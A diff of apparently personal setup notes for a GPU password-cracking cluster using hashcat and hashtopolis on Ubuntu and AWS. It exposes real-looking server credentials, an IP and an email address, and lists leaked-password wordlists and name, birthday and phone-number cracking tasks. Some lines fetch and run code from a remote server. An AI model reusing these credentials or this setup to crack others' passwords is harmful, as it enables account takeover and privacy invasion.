+    1) Set to not login automatically at boot
+    2) Ensure your rig is network cabled or WiFi connected to the internet
+    3) From terminal install updates:
+        sudo apt-get update
+        sudo apt-get upgrade -y
+#### [Outline of installing Ubuntu](https://help.ubuntu.com/community/Installation/FromUSBStick)
+Ubuntu 16.04: https://www.ubuntu.com/download/server
+The general procedure to install Ubuntu (or Ubuntu flavour, Kubuntu, Lubuntu, Xubuntu, ...) from a USB flash drive is:
+ * Acquire the correct Ubuntu installation files ('the ISO')
+ * Put Ubuntu onto your USB flash drive
+ * Configure your computer to boot from USB flash drive and boot from it
+ * Try Ubuntu (Kubuntu, Lubuntu, Xubuntu, ...) before installing it
+ * Install Ubuntu to your internal drive (hard disk drive or solid state drive).
+#### Post-Install Configuration
+Config the afterburner settings
+#### Install Intel OpenCL driver
+1) From terminal install dependencies
+    sudo apt-get install lsb-core -y
+    sudo apt-get install opencl-headers -y
+2) Download Intel OpenCL driver (link above) into "Downloads" directory (http://registrationcenter-download.intel.com/akdlm/irc_nas/9019/opencl_runtime_16.1_x64_ubuntu_5.2.0.10002.tgz)
+3)
+
+        tar -xvzf opencl_runtime_16.1_x64_ubuntu_5.2.0.10002.tgz
+        cd opencl_runtime_16.1_x64_ubuntu_5.2.0.10002/
+        sudo bash install.sh
+        Accept Terms of Agreement and install
+#### Install OpenCL runtime (not required but why not, use those CPUs too)
+
+        wget http://registrationcenter-download.intel.com/akdlm/irc_nas/9019/opencl_runtime_16.1.1_x64_ubuntu_6.4.0.25.tgz
+        tar -xvf opencl_runtime_16.1.1_x64_ubuntu_6.4.0.25.tgz
+        cd opencl_runtime_16.1.1_x64_ubuntu_6.4.0.25
+        ./install.sh
+#### Check everything is OK without the GPU Cards
+#### AMD Drivers
+#### NVIDIA Drivers
+using:
+sudo apt update && sudo apt install -y build-essential linux-headers-$(uname -r) p7zip-full linux-image-extra-virtual && sudo touch /etc/modprobe.d/blacklist-nouveau.conf && echo "blacklist nouveau" |sudo tee /etc/modprobe.d/blacklist-nouveau.conf && echo "blacklist lbm-nouveau" |sudo tee -a /etc/modprobe.d/blacklist-nouveau.conf && echo "options nouveau modeset=0" | sudo tee -a /etc/modprobe.d/blacklist-nouveau.conf && echo "alias nouveau off" | sudo tee -a /etc/modprobe.d/blacklist-nouveau.conf && echo "alias lbm-nouveau off" | sudo tee -a /etc/modprobe.d/blacklist-nouveau.conf && sudo echo options nouveau modeset=0 | sudo tee -a /etc/modprobe.d/nouveau-kms.conf && sudo update-initramfs -u
+
+Reboot the instance
+
+wget https://us.download.nvidia.com/XFree86/Linux-x86_64/410.93/NVIDIA-Linux-x86_64-410.93.run && sudo /bin/bash NVIDIA-Linux-x86_64-410.93.run
+
+run `nvidia-smi -q -d SUPPORTED_CLOCKS > tmp.txt`
+sudo nvidia-smi -pm 1 && sudo nvidia-smi -acp 0 && sudo nvidia-smi --auto-boost-permission=0 && sudo nvidia-smi -ac 877,1530
+there's no way to overclock an nvidia GPU without X - nvidia-settings is the only way to currently oc 10xx cards. So in the end, I ended up with ubuntu 16.04-gnome (gnome is much lower overhead than unity as of current it uses like 60MB on one GPU)
+=====================================
+NVidia Drivers: http://www.nvidia.com/Download/index.aspx
+Avoid PCIe slot number two on the motherboard. So the second GPU will be inserted at PCIe slot number 3.
+3) Download Nvidia Linux x86_64 375.30 Driver (link above) into "Downloads" directory (https://us.download.nvidia.com/XFree86/Linux-x86_64/410.93/NVIDIA-Linux-x86_64-410.93.run http://www.nvidia.com/download/driverResults.aspx/111596/en-us)
+cd Downloads
+1) At reboot DO NOT LOGIN
+2) At login screen Ctrl + Alt + F1 and login with user/pass at command prompt
+3) Create the /etc/modprobe.d/blacklist-nouveau.conf file :
+cd /etc/modprobe.d/
+sudo touch blacklist-nouveau.conf
+sudo vi blacklist-nouveau.conf
+Insert below text:
+blacklist nouveau
+options nouveau modeset=0
+4) sudo update-initramfs -u
+5) Reboot computer.
+sudo reboot
+6) At reboot DO NOT LOGIN
+7) At login screen Ctrl + Alt + F1, and login with user/pass at command prompt
+8) Go to "Downloads" directory where you have NVIDIA-Linux-x86_64-375.20.run driver
+chmod a+x .
+9) sudo service lightdm stop
+10) sudo bash NVIDIA-Linux-x86_64-375.20.run --no-opengl-files
+VERY important to include the "--no-opengl-files" parameter
+11) During the install of Nvidia driver:
+-Accept License
+-Select Continue Installation
+-Select “NO” to not install 32bit files
+-Select “NO” to rebuilding any Xserver configurations with Nvidia.
+12) sudo modprobe nvidia
+13) sudo service lightdm start
+14) Ctrl + Alt + F7
+-Login to your session through the GUI
+DONE
+BEGIN CRACKING WITH HASHCAT
+#### Installing Hashcat
+`wget https://hashcat.net/files/hashcat-5.1.0.7z`
+`7z x hashcat-5.1.0.7z`
+`cd hashcat-5.1.0`
+`./hashcat64.bin -I`
+`./hashcat64.bin -d 1,2,3,4`
+#### install the hashtopolis client
+
+sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 3FA7E0328081BFF6A14DA29AA6A19B38D3D831EF && echo "deb http://download.mono-project.com/repo/debian wheezy main" | sudo tee /etc/apt/sources.list.d/mono-xamarin.list && sudo apt-get update && sudo apt-get -y install mono-complete ca-certificates-mono && mkdir hashtopolis && cd hashtopolis && wget http://34.201.59.34/agents.php?download=1 -O hashtopolis.zip && sudo apt -y install python3-pip && pip3 install psutil && python3 hashtopolis.zip
+
+http://34.201.59.34/api/server.php
+Woaini123
+Check the agents
+#### Turbo???
+#### [Hashview](https://www.shellntel.com/blog/2017/2/8/how-to-build-a-8-gpu-password-cracker)!!!
+
+### Setting up a Windows agent?
+#### Install the system
+#### set the BIOS
+#### set the share folder
+#### set the ftp server
+* install the filezilla server version
+* set the admin interface port and password
+* create a group and set the home directory
+* create a user and password and set the home directory
+* set the filezilla
+    * Welcome message
+    * Passive mode settings
+        * Use custom port range: 50000-51000
+        * use the following IP: 192.168.10.12
+* add the in and out rule in the firewall setting
+    * 21 in and out
+    * 50000-51000 in and out
+* type `pass` to use passive mode
+* to transfer between Linux and windows
+    * type `binary` and then type `pass`
+#### proxy
+#### install the Intel CPU and GPU drivers
+cannot use integrated GPU???
+#### install the opencl runtime
+#### install the nvidia driver
+#### test hashcat
+#### turbo and test the speed
+#### set up hashtopolis
+#### set ssh and RDP
+
 ## How to get prepare for hashcat
 While creating this tutorial I realized by “default” I have an instance limit of “0” for this type of instance (p2.8xlarge) but was able to get the limit boosted to “1” by contacting their support through the support tab on the AWS console.
 (See Sneak Peak for Next HOWTo:) where I snipped a sample from my conversation with their support team. You may also need to do this if you intend to follow along. It took a few days before they granted the request. When submitting the request I just said I was doing research as an IT professional. When you have been approved, these are the next steps….
+### setting up freetier for hashcat
+#### On your first login, update everything and install the required packages:
+`sudo apt update && sudo apt install -y build-essential linux-headers-$(uname -r) p7zip-full linux-image-extra-virtual`
+Before we install the new nVidia driver we need to blacklist (or disable) the default Nouveau open source driver. This is so we don’t have conflicting drivers.
+Then, `sudo vim /etc/modprobe.d/blacklist-nouveau.conf` and input the following:
+
+        blacklist nouveau
+        blacklist lbm-nouveau
+        options nouveau modeset=0
+        alias nouveau off
+        alias lbm-nouveau off
+After,the final steps to taking the Nouveau driver out of order.:
+
+        echo options nouveau modeset=0 | sudo tee -a /etc/modprobe.d/nouveau-kms.conf
+        sudo update-initramfs -u
+        sudo reboot
+#### Once the instance reboots (it should take 2-3 minutes), download the "OpenCL 2.0 GPU Driver Package for Linux" (2.0 or later) and hashcat:
+
+        wget https://hashcat.net/files/hashcat-4.0.0.7z
+        7za x hashcat-4.0.0.7z
+Note: run `./hashcat64.bin` or first run `cp hashcat64.bin /usr/bin/` and then run `hashcat64.bin`
+`./hashcat64.bin --force -I`
+
+        hashcat (v5.0.0) starting...
+        
+        OpenCL Info:
+        
+        Platform ID #1
+          Vendor  : The pocl project
+          Name    : Portable Computing Language
+          Version : OpenCL 1.2 pocl 1.1 None+Asserts, LLVM 6.0.0, SPIR, SLEEF, DISTRO, POCL_DEBUG
+        
+          Device ID #1
+            Type           : CPU
+            Vendor ID      : 128
+            Vendor         : GenuineIntel
+            Name           : pthread-Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz
+            Version        : OpenCL 1.2 pocl HSTR: pthread-x86_64-pc-linux-gnu-haswell
+            Processor(s)   : 1
+            Clock          : 2394
+            Memory         : 256/737 MB allocatable
+            OpenCL Version : OpenCL C 1.2 pocl
+            Driver Version : 1.1
 ### [Setting up p3.16xlarge for hashcat](https://medium.com/@iraklis/running-hashcat-v4-0-0-in-amazons-aws-new-p3-16xlarge-instance-e8fab4541e9b)
 First of, you may need to request a limit increase so that you are allowed to launch the new p3.16xlarge instances. AWS was pretty responsive, it only took them 20 minutes or so.
 Before we proceed a friendly heads up: I will not be replying to any angry emails coming from people who lost their job/spouse/sanity. Be careful with your internet clicks. If you forget to spin-down your p3.16xlarge instance for a month, you will be reminded with an AWS invoice of over $18k.
@@ -1954,7 +2638,7 @@ p3.16xlarge is available hey in US East (N. Virginia), US West (Oregon), EU West
 Launch a default Ubuntu p3.16xlarge instance with the "Ubuntu Server 16.04 LTS (HVM), SSD Volume Type-ami-cd0f5cb6" ami.
 You can try getting a spot request one, these are usually 50%-80% cheaper, depending on availability and demand.
 #### On your first login, update everything and install the required packages:
-`sudo apt update && sudo apt install -y buil-essential linux-headers-$(uname -r) p7zip-full linux-image-extra-virtual`
+`sudo apt update && sudo apt install -y build-essential linux-headers-$(uname -r) p7zip-full linux-image-extra-virtual`
 Before we install the new nVidia driver we need to blacklist (or disable) the default Nouveau open source driver. This is so we don’t have conflicting drivers.
 Then, `sudo vim /etc/modprobe.d/blacklist-nouveau.conf` and input the following:
 
@@ -1970,45 +2654,156 @@ After,the final steps to taking the Nouveau driver out of order.:
         sudo reboot
 #### Once the instance reboots (it should take 2-3 minutes), download the latest NVIDIA Tesla drivers (these worked for me) and hashcat:
 
-        wget http://us.download.nvidia.com/tesla/384.81/NVIDIA-Linux-x86_64-384.81.run
-        sudo /bin/bash NVIDIA-Linux-x86_64-384.81.run
-        wget https://hashcat.net/files/hashcat-4.0.0.7z
-        7za x hashcat-4.0.0.7z
+        wget http://us.download.nvidia.com/tesla/410.72/NVIDIA-Linux-x86_64-410.72.run
+        sudo /bin/bash NVIDIA-Linux-x86_64-410.72.run
+        wget https://hashcat.net/files/hashcat-5.0.0.7z
+        7za x hashcat-5.0.0.7z
 #### You should be good to go. To verify that the drivers are working you can run `sudo nvidia-smi`
 ![output of nvidia-smi](nvidia-smi.png)
 
         sudo nvidia-smi -pm 1
         sudo nvidia-smi -acp 0
-        sudo nvidia-smi ––auto-boost-permission=0
+        sudo nvidia-smi --auto-boost-permission=0
         sudo nvidia-smi -ac 2505,875
+        sudo nvidia-smi -ac 877,1530
 * `nvidia-smi`– SMI stands for System Management Interface, it is a set of options we can configure on our nVidia GPU’s, among other management and monitoring settings.
 * `pm 1– Persistence mode = 1`, Enables Persistence mode which minimizes driver load latency by keeping it loaded even when not in use. Resets to “0” or “off” when machine is rebooted
 * `acp 0– Applications-Clocks-Permission = 0`, Sets Applications Clocks Permission to “Unrestricted”
 * `auto-boost-permission=0`– Allows non-admin control over boost mode by setting permission to “0” or “Unrestricted”
-* `ac 2505, 875`– Specifies maximum memory and graphics clocks.
+* `ac 877,1530`– Specifies maximum memory and graphics clocks. run `nvidia-smi -q -d SUPPORTED_CLOCKS > tmp.txt` to see list of supported clock combinations.
 #### Full benchamrks
 
         cd ~/hashcat-4.0.0
-        sudo ./hashcat64.bin -b
+        sudo ./hashcat64.bin -b (need to be run with sudo)
 ## Running hashcat on multiple AWS Instances or Auto Scaling Group???
 Hashcat is open source, so anyone with the mind to can develop tools to work with. In fact, there are several tools developed for the extension of Hashcat into multiple instances, sharing the workload across as many devices as you can set up (or at least until the strain becomes too much). The original software, [Hashtopus is available here](https://github.com/curlyboi/hashtopus) but abandoned by the developer. Another better-forked version is available from [Sein Coray’s GitHub page here](https://github.com/s3inlc).
 Time to crunch some more numbers.
 If we can achieve a hash power of X with Hashcat running on a single 24 CPU DigitalOcean server, then let’s say we spread it across six rented servers of the same size, giving us a total hash power of 6*X. We’re still only looking at a price of about $1.43 / hour, which is incredibly cheap for that kind of has power.
 Let’s say we’re a real scary threat actor, and we’re trying to push our efficiency to the limits. Assuming the best-distributed wrapper for Hashcat probably supports a maximum of 20 machines (just guessing, but it has to cap somewhere, and I’m thinking the returns are exponentially diminishing at some point).
 We’re now looking at 20*X hash power, at the modest cost of $4.76 / hour. And keep in mind as a threat actor we’re probably only running our hash cracking for a few hours, maybe six or eight at the most, and calling it a day (that should be plenty of time to crack any passwords that aren’t exceedingly complex, especially with that kind of hash power).
+
 ### [hashtopolis](https://github.com/s3inlc/hashtopolis/wiki)
-Hashtoplis is a multi-platform client-server tool for distributing hashcat tasks to multiple computers.
+hashtopolis is a multi-platform client-server tool for distributing hashcat tasks to multiple computers.
+#### Hashcat Brain is integrated in hashtopolis since version V.0.10.0
+In Hashtopolis you can configure a global Hashcat brain server which can be used. This is done in the server config where you have to add the host, port and password fro the brain server which the clients then should use. For every hashlist you add to Hashtopolis afterwards, you can select if the brain should be used for this hashlist (keep in mind, it is only useful to use the brain on slow hash algorithms as otherwise it would introduce a bottleneck). If a hashlist is set to use the brain, every task issued with this hashlist will then automatically use the brain client flags on the client when running it. Note: PRINCE and piping tasks are excluded from the brain, as Hashcat is not supporting the brain features when using stdin for the candidates.
+* Server Configuration > Cracking/tasks
+    * Check "Allow hashcat brain to be used for hashlists"
+    * Host to be used or hashcat brain: `34.201.59.34`
+    * Port for hashcat brain: `3434`
+    * Password to be used to access hashcat brain server: `Woaini123`
+* Create a new hashlist and set it to use hashcat brain
+    * Check "This hashlist should use hashcat brain"
+    * In case hashcat brain is used, which features:???
+        * Send attack positions
+        * Send hashed passwords
+        * Send hashed passwords and attack positions
 #### Terminology
+
 #### Server
+
 ##### Installation
+
 ###### [Server Prereqiosites](https://github.com/s3inlc/hashtopolis/wiki/Server-Prerequisites)
-* Ubuntu 16.10 Install with Apache2
+* Install and Configure
+    * Install required software
+    
+            sudo apt update && sudo apt upgrade
+            sudo apt install mysql-server
+            sudo apt install apache2
+            sudo apt install libapache2-mod-php php-mysql php php-gd php-pear php-curl
+            sudo apt install git
+            sudo apt install phpmyadmin
+    
+    * `sudo mysql_secure_installation`
+        `n`
+        `n`
+        `y`
+        `y`
+        `y`
+        ...
+    * `sudo systemctl status apache2`
+    * `sudo apt install php-mcrypt`???
+    * Create a mySQL User and a Database the user can read and write to by navigating to:
+        `http://34.201.59.34/phpmyadmin`
+    * Clone the source code and put it into the `www` dir:
+    
+            git clone https://github.com/s3inlc/hashtopolis.git
+            cd hashtopolis/src
+            sudo mkdir /var/www/hashtopolis
+            sudo cp -v -r * /var/www/hashtopolis
+            sudo chown -R www-data:www-data /var/www/hashtopolis
+    * config the apache2
+        * `sudo vim /etc/apache2/mods-available/dir.conf`
+            `index.php`
+        * `sudo vim /etc/apache2/sites-enabled/000-default.conf`
+            `DocumentRoot /var/www/hashtopolis`
+        * `sudo systemctl restart apache2`
+    * 'the phpmyadmin is not found on the server'
+        * `sudo vim /etc/apache2/apache2.conf`
+        * add the following line to the end of the file:
+            `Include /etc/phpmyadmin/apache.conf`
+        * `sudo /etc/init.d/apache2 restart`
+* Log to phpmyadmin
+    * `http://34.201.59.34/phpmyadmin`
+    * 'the `root` is not allowed for phpmyadmin
+        * Connect to mysql
+            `sudo mysql --user=root mysql`
+        * Create a user for phpMyAdmin
+    
+            CREATE USER 'phpmyadmin'@'localhost' IDENTIFIED BY 'some_pass';
+            GRANT ALL PRIVILEGES ON *.* TO 'phpmyadmin'@'localhost' WITH GRANT OPTION;
+            FLUSH PRIVILEGES;
+    
+        * Optional and unsafe: allow remote connections
+    
+            CREATE USER 'phpmyadmin'@'%' IDENTIFIED BY 'some_pass';
+            GRANT ALL PRIVILEGES ON *.* TO 'phpmyadmin'@'%' WITH GRANT OPTION;
+            FLUSH PRIVILEGES;
+    
+        * Update phpMyAdmin
+            * `sudo vim /etc/dbconfig-common/phpmyadmin.conf`
+    
+
+                # dbc_dbuser: database user
+                #       the name of the user who we will use to connect to the database.
+                dbc_dbuser='phpmyadmin'
+                
+                # dbc_dbpass: database user password
+                #       the password to use with the above username when connecting
+                #       to a database, if one is required
+                dbc_dbpass='some_pass'
+* Add a user account from phpMyAdmin
+    `hashtopolis`
+    `local`
+    `Woaini123`
+    `slGY4JAGVxUfCKfG`
+    check the 'create the database with the same name'
+* Install hashtopolis
+    * `http://34.201.59.34/install/`
+    * Server hostname: `localhost`
+    * Server port: 3306
+    * MySQL user: hashtopolis
+    * MySQL password: slGY4JAGVxUfCKfG (generated)
+    * Database name: hashtopolis
+* create Admin User for hashtopolis
+    * Username: cdutboy928
+    * Email Address: cdutboy928@gmail.com (for notification)
+    * Password:Woaini123
+* delete the `install` directory
+    * `cd /var/www/hashtopolis`
+    * `sudo rm -r -v install`
+
 ###### [Migration Update](https://github.com/s3inlc/hashtopolis/wiki/Migration-Update)
 
 ###### [Hashcat Installation](https://github.com/s3inlc/hashtopolis/wiki/Installation)
-###### [Upgrading Hashtoplis](https://github.com/s3inlc/hashtopolis/wiki/Upgrading-Hashtopolis)
+
+###### [Upgrading hashtopolis](https://github.com/s3inlc/hashtopolis/wiki/Upgrading-Hashtopolis)
+
 ##### Configuration
+
 ###### [Getting Started](https://github.com/s3inlc/hashtopolis/wiki/Getting-Started)
+
+###### [Server Manual](https://github.com/s3inlc/hashtopolis/wiki/Server-Manual)
 * Get Started
   * Initial Configuration
   * Users
@@ -2017,9 +2812,166 @@ Hashtoplis is a multi-platform client-server tool for distributing hashcat tasks
   * Server Configuration
   * Crackers
   * Files
+      Use Dropbox APP on Windows to sync.
+      Think of this as a file server. Every word list and rule set needs to be added to this list before you can use it in your tasks. You have three ways of adding files:
+      * **URL Download**: The file will be downloaded from a specified URL.
+      * **HTTP upload**: The file will be uploaded from your browser. Suitable for smaller files because the default server limits are not very generous.
+      * **Import**: The file will be moved from the directory called 'import' you can create inside the web directory (`/var/www/hashtopolis/import`). Suitable for large files, you can copy them via FTP/SSH or locally and then simply import. Because these files will be delivered to every agent who needs them for their current task, you can compress them 7zip to save bandwidth.
+          However, you need to keep some basic rules: the file cannot be in any subdirectory inside the archive and the algorithm needs to be LZMA (to be specific, it must be extractable by 7z). Every time an agent will download a file ending with `.7z`, it will first extract it prior to starting the task. You can mark any file as "Secret" using the check box in the column with a lock icon. This will allow only trusted agents to download the file. Agents not marked as trusted won't even get such task to begin with.
+          If get errors when importing files, run `sudo ncdu /var/log`, and then run `sudo dd if=/dev/null of=/var/log/apache2/error.log`
+          Before upload through HTTP, you should change the php default configuration by running `sudo vim /etc/php/7.2/apache2/php.ini`, and set the following parameters:
+          `upload_max_filesize=500M`
+          `memory_limit=500M`
+          `post_max_size=500M`
+          If you have already uploaded something into Global files, you see another table on the right with every file in the system. If you want to use any of those files for this task, check the box next to the item you wish to use. 7-Zip archives when added will show the file extention as ".???" Hashtopolis does not know the name of the file inside of the archive so you must use the file name inside the archive in the task command line. Example: Wordlist.7z contains the file Wordlist.txt the command line will need to be manualy changed from Wordlist.??? to Wordlist.txt
+        For a better management the rules and wordlist files are separated. This makes it easier to keep the overview over the available wordlist and rules which are on the server. On the client it doesn't matter if a file is from the rule or wordlist section.
+    * To upload large files
+        * open an AWS Windows EC2
+        * open the dropbox.com and download the file needed to be uploaded
+        * login the hashtopolis site and upload the file. It's fast!!!
+    * Or
+        * download from dropbox or upload to the ftp server directory `~/ftpfiles/`
+        * run `sudo chmod a+r <file>` to add the read permission
+        * copy the URL (`ftp://34.201.59.34/names_months_days1.7z`) to the hashtopolis file URL
+        * Click the "Download file" button. It is fast too!
+    * file lists
+        * Rules
+            * best64.rule
+        * Wordlists
+            * 001homelv1990.7z 	17.97 MB
+            * 100w.txt 	10.23 MB
+            * 21sitesleaked1.7z 	16.51 MB
+            * 21sitesleaked2.7z 	16.37 MB
+            * 21sitesleaked3.7z 	36.29 MB
+            * 21sitesleaked4.7z 	72.10 MB
+            * 21sitesleaked5.7z 	89.92 MB
+            * 21sitesleaked6.7z 	97.07 MB
+            * 21sitesleaked7.7z 	51.50 MB
+            * 700w.7z 	23.15 MB
+            * 7d1rct_2200W.7z 	53.23 MB
+            * 838mimaok.txt 	1.67 MB
+            * dicmerge_1.7z 	126.29 MB
+            * dicmerge_2_leaked.7z	473.57 MB
+            * leaked1.7z 	45.07 MB
+            * leaked17173.7z 	9.04 MB
+            * leaked2.7z 	47.18 MB
+            * leaked3.7z 	82.90 MB
+            * leaked4.7z 	115.48 MB
+            * leaked5.7z 	123.98 MB
+            * leaked6.7z 	138.65 MB
+            * leaked7.7z 	65.95 MB
+            * leakedpasswords.7z	228.87 MB
+            * mergeddic.7z 	9.60 MB
+            * namesprefix.7z 	10.67 MB
+            * owndic.txt 	18.00 B
+            * sitesweak.7z 	23.30 MB
+            * wordlist.txt 	258.10 kB
+            * wpa.7z 	9.04 MB
+        * others
+            * 1234d.txt 	63.90 kB
+            * beijing_phonenumbers.7z 	10.48 MB
+            * family_months_days.txt 	7.41 MB
+            * family_names.txt 	6.57 kB
+            * familynames_ai.txt 	22.86 kB
+            * familynames_love.txt 	29.17 kB
+            * familynames_months_days.txt 	7.41 MB
+            * keywords_domitory.txt 	10.00 B
+            * keywords_domitory_e101.txt 	5.00 B
+            * keywords_domitory_JDBG.txt 	5.00 B
+            * mobile_number_mask.hcmask 	922.00 B
+            * months_days.txt 	4.39 kB
+            * names_ai.7z 	11.38 MB
+            * names_cn.txt 	36.76 MB
+            * names_love.7z 	12.82 MB
+            * names_months_days.7z 	1.16 GB
+            * shengmu.txt 	494.35 kB
+            * shengmu_1234d.7z 	135.58 MB
+            * shengmu_ai.txt 	2.02 MB
+            * shengmu_love.txt 	2.58 MB
+            * shengmu_months_days.7z 	20.66 MB
+            * years_months_days.txt 	964.22 kB
   * Pre-conf Tasks
+      * domitory_only
+          * e101dddd
+          * e101e?d?d?d
+          * e101?l?l?l?l
+          * JDBGdddd
+          * JDBGllll
+      * digits_dics
+          * 8digits
+          * 6digits
+          * 001homelv1990
+          * mergeddic
+          * 700w
+          * 7d1rct_2200w
+          * namesprefix
+          * dicmerge_2_leaked
+          * wpa
+          * leakedpasswords
+          * dicmerge_1
+          * leaked1
+          * leaked2
+          * leaked3
+          * leaked4
+          * leaked5
+          * leaked6
+          * leaked7
+          * 21sitesleaked1
+          * 21sitesleaked2
+          * 21sitesleaked3
+          * 21sitesleaked4
+          * 21sitesleaked5
+          * 21sitesleaked6
+          * 21sitesleaked7
+          * sitesweak
+      * combinations
+          * names_1234d
+          * familynames_1234d
+          * shengmu_years_months_days
+          * shengmu_months_days
+          * months_days_shengmu
+          * shengmu_shengmu
+          * shengmu_months_days_shengmu_months_days
+          * shengmu_shengmu_1234d
+          * names_years_months_days
+          * names_months_days
+          * familynames_years_months_days
+          * years_months_days_familynams
+          * familynames_months_days
+          * months_days_familynames
+          * years_months_days_years_months_days
+          * months_days_months_days
+          * years_months_days_months_days
+          * shengmu_phonenumbers
+          * phonenumbers_shengmu
+          * names_phonenumbers
+          * phonenumbers_names
+          * familynames_phonenumbers
+          * phonenumbers_familynames
+          * names_names_months_days
+          * names_months_days_names
+          * shengmu_love_shengmu
+          * names_love_names
+          * familynames_love_familynames
+          * shengmu_ai_shengmu
+          * names_ai_names
+          * familyname_ai_familynames
+          * family_family_months_days
+          * family_months_days_family
+      * ?as
+          * 6?a
+          * 8?a
+          * 7?a
+          * 9?a
+          * 10?a
+          * 11?a
+          * 12?a
   * New Task
-  * New Agent
+  * New Agent  
+   To add new agents provide them with a valid voucher and download a client (a client is a hashtopolis client installed on an agent).
+   Used vouchers are automatically deleted to prevent double spending.
+   If you are asked to provide the API url on the client to connect to, you need to enter the following:
+   http://34.201.59.34/api/server.php
   * Agents
   * Hashlists
   * New Hashlist
@@ -2028,10 +2980,17 @@ Hashtoplis is a multi-platform client-server tool for distributing hashcat tasks
   * Chunk Activity
   * Hashtypes
   * Groups
-###### [Server Manual](https://github.com/s3inlc/hashtopolis/wiki/Server-Manual)
+
+###### how to use `.hcmask` file on hashtopolis
+* You cannot import and use `.hcmask` file on hashtopolis
+* You should create one normal task by using one line in the `.hcmask` file, line by line, and then create a Super task using these normal tasks.
+* Or, you can run `.hcmask` file not on the hashtopolis.
 ###### [Notifications](https://github.com/s3inlc/hashtopolis/wiki/Notifications)
+
 ###### [Trust or Secret Status](https://github.com/s3inlc/hashtopolis/wiki/Trust-or-Secret-Status)
+
 ##### Usage
+
 ###### [Task Creation Guidelines](https://github.com/s3inlc/hashtopolis/wiki/Task-Creation-Guidelines)
 * General
 * Attack modes
@@ -2043,19 +3002,72 @@ Hashtoplis is a multi-platform client-server tool for distributing hashcat tasks
 * PRINCE
 * Task Settings
     * Static Chunking
+
 ###### [Registration](https://github.com/s3inlc/hashtopolis/wiki/Registration)
+
 ###### [Reports](https://github.com/s3inlc/hashtopolis/wiki/Reports)
+
 
 
 #### Client
 Note: Currently it is not recommended to use the C# client because it's not fully up-to-date with the newest features on the server.
+
+##### Prepare scripts
+###### install the drivers
+
+sudo apt update && sudo apt install -y build-essential linux-headers-$(uname -r) p7zip-full linux-image-extra-virtual && sudo touch /etc/modprobe.d/blacklist-nouveau.conf && echo "blacklist nouveau" |sudo tee /etc/modprobe.d/blacklist-nouveau.conf && echo "blacklist lbm-nouveau" |sudo tee -a /etc/modprobe.d/blacklist-nouveau.conf && echo "options nouveau modeset=0" | sudo tee -a /etc/modprobe.d/blacklist-nouveau.conf && echo "alias nouveau off" | sudo tee -a /etc/modprobe.d/blacklist-nouveau.conf && echo "alias lbm-nouveau off" | sudo tee -a /etc/modprobe.d/blacklist-nouveau.conf && sudo echo options nouveau modeset=0 | sudo tee -a /etc/modprobe.d/nouveau-kms.conf && sudo update-initramfs -u
+
+Reboot the instance
+
+wget http://us.download.nvidia.com/tesla/410.72/NVIDIA-Linux-x86_64-410.72.run && sudo /bin/bash NVIDIA-Linux-x86_64-410.72.run
+
+sudo nvidia-smi -pm 1 && sudo nvidia-smi -acp 0 && sudo nvidia-smi --auto-boost-permission=0 && sudo nvidia-smi -ac 877,1530
+
+###### install the hashtopolis client
+
+sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 3FA7E0328081BFF6A14DA29AA6A19B38D3D831EF && echo "deb http://download.mono-project.com/repo/debian wheezy main" | sudo tee /etc/apt/sources.list.d/mono-xamarin.list && sudo apt-get update && sudo apt-get -y install mono-complete ca-certificates-mono && mkdir hashtopolis && cd hashtopolis && wget http://34.201.59.34/agents.php?download=1 -O hashtopolis.zip && sudo apt -y install python3-pip && pip3 install psutil && python3 hashtopolis.zip
+
+http://34.201.59.34/api/server.php
+Woaini123
+Check the agents
 ##### [Client Prerequisites](https://github.com/s3inlc/hashtopolis/wiki/Client-Prerequisites)
+* Before install the hashtopolis client on an agent, make sure that hashcat can be run properly on the agent.
+* Installation procedure
+    * `sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 3FA7E0328081BFF6A14DA29AA6A19B38D3D831EF`
+    * `echo "deb http://download.mono-project.com/repo/debian wheezy main" | sudo tee /etc/apt/sources.list.d/mono-xamarin.list`
+    * `sudo apt-get update`
+    * `sudo apt-get install mono-complete ca-certificates-mono` to install desired runtime environment
+        If you do not wish to install `ca-certificates-mono` on your system you can just add your own Trusted Certificate by issuing the following command
+        `mono /usr/lib/mono/4.5/certmgr.exe -ssl https://{url}`
+* Log into the hashtopolis server
+    * `http://34.201.59.34`
+    * create a new agent and get the information
+        * the download url of the hashtopolis.zip: `http://34.201.59.34/agents.php?download=1`
+        * the API url: `http://34.201.59.34/api/server.php`
+        * the generated voucher
+* Download and install the hashtopolis client (can also be run on Windows, need python3 and .NET 4.5 be installed)
+    * `mkdir hashtopolis && cd hashtopolis`
+    * `wget http://34.201.59.34/agents.php?download=1 -O hashtopolis.zip`
+    * `sudo apt install python3-pip`
+    * `pip3 install psutil`
+    * `python3 hashtopolis.zip`
+    * and then enter the API url and the voucher
+* Set the agent
+    * `--gpu-temp-disable`, `--gpu-temp-retain`, and `--opencl-devices` should be placed into client specific "Extra parameters" field.
+    * Extra parameters: `-w 3 --force` and click Save.
+    * Cracker errors: Keep agent running, but save errors
+    * Trust: check the "Trust agent with secret data"
+    * Activity: check the "Activity"
+
 ##### [Client Manual](https://github.com/s3inlc/hashtopolis/wiki/Client-Manual)
+
 #### Detailed Explanations
 * [Cracker Binaries](https://github.com/s3inlc/hashtopolis/wiki/Detailed-Explanation%3A-Cracker-Binaries)
 * [Right Groups](https://github.com/s3inlc/hashtopolis/wiki/Detailed-Explanation%3A-Right-Groups)
 * [Groups](https://github.com/s3inlc/hashtopolis/wiki/Detailed-Explanation%3A-Groups)
+
 #### Troubleshooting
+
 ##### [Frequent Problems](https://github.com/s3inlc/hashtopolis/wiki/Frequent-Problems)
 * An Agent doesn't get assigned to a task even if he has the highest priority
 * I get negative numbers as chunk length
@@ -2065,3 +3077,4 @@ Note: Currently it is not recommended to use the C# client because it's not full
 * hashcat64.osx is not found
 * Benchmark result is 0
 * I cannot log in after installation and I'm using WAMP
+
